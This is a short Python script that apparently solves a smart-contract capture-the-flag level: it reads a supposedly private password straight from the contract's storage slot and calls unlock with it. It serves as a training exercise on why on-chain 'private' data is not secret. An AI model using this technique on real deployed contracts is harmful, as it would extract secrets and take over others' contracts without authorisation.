from scripts.level_helper import *

@setup_instance
def main(instance, player, attack):
    password = web3.eth.getStorageAt(instance.address, 1)
    print(f'The password is {password}')
    instance.unlock(password, {'from': player})

